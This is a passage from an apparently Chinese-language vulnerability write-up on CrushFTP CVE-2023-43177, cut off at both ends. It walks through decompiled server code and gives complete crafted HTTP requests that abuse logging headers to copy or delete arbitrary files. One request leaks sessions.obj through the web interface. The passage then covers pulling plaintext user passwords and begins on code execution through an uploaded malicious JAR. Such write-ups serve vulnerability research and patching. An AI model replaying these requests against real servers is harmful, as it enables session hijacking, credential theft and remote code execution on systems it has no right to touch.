application/jsonrequest;charset=utf-8&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Type: text/&quot;</span> + (response.indexOf(<span class="string">&quot;&lt;?xml&quot;</span>) &gt;= <span class="number">0</span> ? <span class="string">&quot;xml&quot;</span> : <span class="string">&quot;plain&quot;</span>) + <span class="string">&quot;;charset=utf-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (acceptsGZIP) &#123;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Vary: Accept-Encoding&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Content-Encoding: gzip&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Transfer-Encoding: chunked&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Date: &quot;</span> + <span class="keyword">this</span>.thisSessionHTTP.sdf_rfc1123.format(<span class="keyword">new</span> Date()), log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;Server: &quot;</span> + ServerStatus.SG(<span class="string">&quot;http_server_header&quot;</span>), log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_command_http(<span class="string">&quot;P3P: CP=\&quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\&quot;&quot;</span>, log, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String origin = <span class="keyword">this</span>.thisSessionHTTP.headerLookup.getProperty(<span class="string">&quot;ORIGIN&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (x &lt; ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>).length) &#123;</span><br><span class="line">                <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">if</span> (origin.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                    ok = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>)[x].toUpperCase().trim().equalsIgnoreCase(origin.toUpperCase().trim())) &#123;</span><br><span class="line">                    ok = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Origin: &quot;</span> + ServerStatus.SG(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>).split(<span class="string">&quot;,&quot;</span>)[x].trim());</span><br><span class="line">                &#125;</span><br><span class="line">                ++x;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Headers: authorization,content-type&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,PROPFIND,DELETE,MKCOL,MOVE,COPY,HEAD,PROPPATCH,LOCK,UNLOCK,ACL,TR&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;&quot;</span>, log);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = response.getBytes(<span class="string">&quot;UTF8&quot;</span>);</span><br><span class="line">        GZIPOutputStream out = <span class="keyword">new</span> GZIPOutputStream(baos);</span><br><span class="line">        ((OutputStream)out).write(b);</span><br><span class="line">        out.finish();</span><br><span class="line">        <span class="keyword">if</span> (baos.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.original_os.write((String.valueOf(Long.toHexString(baos.size())) + <span class="string">&quot;\r\n&quot;</span>).getBytes());</span><br><span class="line">            baos.writeTo(<span class="keyword">this</span>.thisSessionHTTP.original_os);</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.original_os.write(<span class="string">&quot;\r\n&quot;</span>.getBytes());</span><br><span class="line">            baos.reset();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.original_os.write(<span class="string">&quot;0\r\n\r\n&quot;</span>.getBytes());</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.original_os.flush();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.thisSessionHTTP.write_standard_headers(log);</span><br><span class="line">        <span class="keyword">int</span> len = response.getBytes(<span class="string">&quot;UTF8&quot;</span>).length + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Length: &quot;</span> + len, log_header);</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;&quot;</span>, log);</span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.thisSessionHTTP.write_command_http(response, log, convertVars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.thisSessionHTTP.thisSession.drain_log();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当请求结束，在响应完成之后，在倒数第二行调用了<code>drain_log</code>方法，这个方法也很有意思</p><p>可以看到如果属性当中存在<code>user_log_path_custom</code>，并且不为空，接下来再结合覆盖其他参数</p><ol><li>user_log_path_custom 中的值为new_loc</li><li>user_log_path 中指定的值为old_loc</li><li>旧文件将复制到指定的新位置，并删除旧文件</li></ol><p>现在我们可以做到<code>任意文件复制以及删除</code>，但经过测试我们会发现，如果我们读取一些敏感的配置文件到web路径下，访问后再移动回去会破坏掉文件本身的一些完整性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drain_log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">.....省略.....</span><br><span class="line">    object = <span class="keyword">this</span>.uiVG(<span class="string">&quot;user_log&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path_custom&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String new_loc = <span class="string">&quot;&quot;</span> + <span class="keyword">this</span>.user_info.remove(<span class="string">&quot;user_log_path_custom&quot;</span>);</span><br><span class="line">            String old_loc = <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.uiPUT(<span class="string">&quot;user_log_path&quot;</span>, new_loc);</span><br><span class="line">            <span class="keyword">new</span> File_S(Common.all_but_last(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>))).mkdirs();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).exists() &amp;&amp; !<span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).renameTo(<span class="keyword">new</span> File_S(String.valueOf(new_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)))) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Common.copy(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>), String.valueOf(new_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>), <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    <span class="comment">// empty catch block</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">new</span> File_S(String.valueOf(old_loc) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)).delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            com.crushftp.client.Common.copyStreams(<span class="keyword">new</span> ByteArrayInputStream(sb.toString().getBytes(<span class="string">&quot;UTF8&quot;</span>)), <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File_S(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)), <span class="keyword">true</span>), <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">new</span> File_S(Common.all_but_last(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>))).mkdirs();</span><br><span class="line">                com.crushftp.client.Common.copyStreams(<span class="keyword">new</span> ByteArrayInputStream(sb.toString().getBytes(<span class="string">&quot;UTF8&quot;</span>)), <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File_S(String.valueOf(<span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_path&quot;</span>)) + <span class="keyword">this</span>.uiSG(<span class="string">&quot;user_log_file&quot;</span>)), <span class="keyword">true</span>), <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IOException ee) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;SERVER&quot;</span>, <span class="number">1</span>, ee);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.log(<span class="string">&quot;SERVER&quot;</span>, <span class="number">1</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>毕竟是log功能，程序会将请求记录不断写入<img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210234410800.png" alt="image-20231210234410800"></p><p>而这部分功能则是受<code>add_log</code>控制，可以看到如果<code>dont_log</code>为<code>true</code>，那么就不会记录当前请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add_log</span><span class="params">(String log_data, String short_data, String check_data)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.uiBG(<span class="string">&quot;dont_log&quot;</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logDateFormat == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.logDateFormat = (SimpleDateFormat)ServerStatus.thisObj.logDateFormat.clone();</span><br><span class="line">      &#125;</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>因此我们不难构造出</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/WebInterface/function/?command=getUsername&amp;c2f=a4Ga</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">as2-to</span><span class="punctuation">: </span>X</span><br><span class="line">user_name: crushadmin</span><br><span class="line">user_log_file: file_to_read</span><br><span class="line">user_log_path_custom: WebInterface/</span><br><span class="line">user_log_path: ./</span><br><span class="line">dont_log: true</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;</span><br><span class="line"></span><br><span class="line"><span class="ini"><span class="attr">post</span>=body</span></span><br></pre></td></tr></table></figure><p>表面上看来到此漏洞可能已经利用结束了，但实际上还能再更进一步</p><p>但继续阅读源码我们会发现，程序在运行过程还会”定期”，将session当中的属性信息保存到sessions.obj文件当中</p><p>再来看看它是如何生成的,在<code>crushftp.handlers.SharedSession#flush</code>中如果属性<code>allow_session_caching_memory</code>为<code>true</code>才会执行，默认配置为<code>true</code></p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211185653980.png" alt="image-20231211185653980"></p><p>flush的调用在<code>crushftp.handlers.SharedSession#shutdown</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ServerStatus.BG(<span class="string">&quot;allow_session_caching_on_exit&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (ServerStatus.siVG(<span class="string">&quot;user_list&quot;</span>).size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Properties user_info = (Properties)ServerStatus.siVG(<span class="string">&quot;user_list&quot;</span>).elementAt(<span class="number">0</span>);</span><br><span class="line">            SessionCrush thisSession = (SessionCrush)user_info.get(<span class="string">&quot;session&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (thisSession != <span class="keyword">null</span>) &#123;</span><br><span class="line">                thisSession.do_kill(<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ServerStatus.thisObj.remove_user(user_info);</span><br><span class="line">            &#125;</span><br><span class="line">            ServerStatus.siVG(<span class="string">&quot;user_list&quot;</span>).remove(user_info);</span><br><span class="line">        &#125;</span><br><span class="line">        SharedSession recent_users = SharedSession.find(<span class="string">&quot;recent_user_list&quot;</span>);</span><br><span class="line">        recent_users.put(<span class="string">&quot;recent_user_list&quot;</span>, ServerStatus.siVG(<span class="string">&quot;recent_user_list&quot;</span>));</span><br><span class="line">        recent_users.put(<span class="string">&quot;user_login_num&quot;</span>, ServerStatus.siSG(<span class="string">&quot;user_login_num&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    shutting_down = <span class="keyword">true</span>;</span><br><span class="line">    SharedSession.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shutdown的调用在<code>crushftp.handlers.ShutdownHandler#run</code>，可以看到在构造函数当中，为通过<code>Runtime.getRuntime().addShutdownHook(this)</code>向JVM注册了一个关闭时的Hook动作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShutdownHandler</span></span></span><br><span class="line"><span class="class"><span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> shutdown = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShutdownHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Unable to fully structure code</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        block6: &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.shutdown) <span class="keyword">break</span> block6;</span><br><span class="line">            AdminControls.stopLogins(<span class="keyword">new</span> Properties(), <span class="string">&quot;CONNECT)&quot;</span>);</span><br><span class="line">            start = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">true</span>) ** GOTO lbl13</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (InterruptedException var3_2) &#123;</span><br><span class="line">                    <span class="comment">// empty catch block</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ServerStatus.siVG(<span class="string">&quot;running_tasks&quot;</span>).size() &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (System.currentTimeMillis() - start &lt; ServerStatus.LG(<span class="string">&quot;active_jobs_shutdown_wait_secs&quot;</span>) * <span class="number">1000L</span>);</span><br><span class="line">            SharedSession.shutdown();</span><br><span class="line">            ServerStatus.thisObj.statTools.stopDB();</span><br><span class="line">            ServerStatus.thisObj.searchTools.stopDB();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.shutdown = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (ServerStatus.thisObj.loggingProvider1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ServerStatus.thisObj.loggingProvider1.flushNow();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ServerStatus.thisObj.loggingProvider2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ServerStatus.thisObj.loggingProvider2.flushNow();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此保存的条件是重启过服务器…，这个文件的作用相当于是充当了服务器重启时的缓存，因此漏洞利用需要看运气了，这里为了重现漏洞我们重启一下系统生成这个文件</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210235316865.png" alt="image-20231210235316865"></p><p>这里我们得到了完整的流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /WebInterface/function/?command=getUsername&amp;c2f=a4Ga HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line">as2-to: X</span><br><span class="line">user_name: crushadmin</span><br><span class="line">user_log_file: sessions.obj</span><br><span class="line">user_log_path_custom: WebInterface/</span><br><span class="line">user_log_path: ./</span><br><span class="line">dont_log: <span class="keyword">true</span></span><br><span class="line">Content-Length: <span class="number">9</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: currentAuth=a4Ga; CrushAuth=1702222555460_GEeImKOtIut9bj65EsoOrsDUAYa4Ga;</span><br><span class="line"></span><br><span class="line">post=body</span><br></pre></td></tr></table></figure><p>之后访问<code>/WebInterface/sessions.obj/WebInterface/sessions.obj</code>即可获取到泄漏的session信息</p><p>在这里我们还可以尝试权限维持，可以看到这里存在一个接口可以直接获取到明文密码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (command.equalsIgnoreCase(<span class="string">&quot;getUser&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (AdminControls.checkRole(command, site, <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiSG(<span class="string">&quot;user_ip&quot;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(AdminControls.buildXML(AdminControls.getUser(request, site, <span class="keyword">this</span>.thisSessionHTTP.thisSession), <span class="string">&quot;user_items&quot;</span>, <span class="string">&quot;OK&quot;</span>), <span class="keyword">true</span>, <span class="number">200</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(<span class="string">&quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied.&lt;/response&gt;&lt;/commandResult&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>AdminControls.getUser</code>当中，通过username查询到用户信息并返回</p><p>在这里比较骚的一点，系统会按照pass掉格式自适应解码，因此我们拿到的密码是明文~~~(Ps：就算不是也无所谓里面都是硬编码)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getUser</span><span class="params">(Properties request, String site, SessionCrush thisSession)</span> </span>&#123;</span><br><span class="line">......省略.......</span><br><span class="line">        username = thisSession.uiSG(<span class="string">&quot;user_name&quot;</span>);</span><br><span class="line">......省略.......</span><br><span class="line">        VFS uVFS = UserTools.ut.getVFS(request.getProperty(<span class="string">&quot;serverGroup&quot;</span>), username);</span><br><span class="line">        Properties new_user = UserTools.ut.getUser(request.getProperty(<span class="string">&quot;serverGroup&quot;</span>), username, <span class="keyword">false</span>);</span><br><span class="line">......省略.......</span><br><span class="line">        String pass = new_user.getProperty(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!(pass.startsWith(<span class="string">&quot;SHA:&quot;</span>) || pass.startsWith(<span class="string">&quot;SHA512:&quot;</span>) || pass.startsWith(<span class="string">&quot;SHA256:&quot;</span>) || pass.startsWith(<span class="string">&quot;SHA3:&quot;</span>) || pass.startsWith(<span class="string">&quot;MD5:&quot;</span>) || pass.startsWith(<span class="string">&quot;CRYPT3:&quot;</span>) || pass.startsWith(<span class="string">&quot;BCRYPT:&quot;</span>) || pass.startsWith(<span class="string">&quot;MD5CRYPT:&quot;</span>) || pass.startsWith(<span class="string">&quot;PBKDF2SHA256:&quot;</span>) || pass.startsWith(<span class="string">&quot;SHA512CRYPT:&quot;</span>) || pass.startsWith(<span class="string">&quot;ARGOND:&quot;</span>))) &#123;</span><br><span class="line">            pass = ServerStatus.thisObj.common_code.decode_pass(pass);</span><br><span class="line">            new_user.put(<span class="string">&quot;password&quot;</span>, pass);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            new_user.put(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;SHA3:XXXXXXXXXXXXXXXXXXXX&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!new_user.getProperty(<span class="string">&quot;userVersion&quot;</span>, <span class="string">&quot;&quot;</span>).equals(<span class="string">&quot;6&quot;</span>) &amp;&amp; !new_user.getProperty(<span class="string">&quot;as2EncryptKeystorePassword&quot;</span>, <span class="string">&quot;&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            new_user.put(<span class="string">&quot;as2EncryptKeystorePassword&quot;</span>, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(<span class="string">&quot;as2EncryptKeystorePassword&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="string">&quot;DES&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            new_user.put(<span class="string">&quot;as2EncryptKeyPassword&quot;</span>, ServerStatus.thisObj.common_code.encode_pass(new_user.getProperty(<span class="string">&quot;as2EncryptKeyPassword&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="string">&quot;DES&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">......省略.......</span><br></pre></td></tr></table></figure><p>简单发包做个验证</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211001218626.png" alt="image-20231211001218626"></p><h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><p>在后台设置中，发现可以动态加载 SQL 驱动程序和配置测试，因此只需要能够上传恶意 JAR 文件即可实现RCE</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211000554219.png" alt="image-20231211000554219"></p><p>毕竟是FTP一定存在上传的点，但是在上传后发现没有权限</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211130810142.png" alt="image-20231211130810142"></p><p>经过查找我们可以发现在后台可以增加虚拟路径和物理路径的映射</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211131426907.png" alt="image-20231211131426907"></p><p>顺便抓了个包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 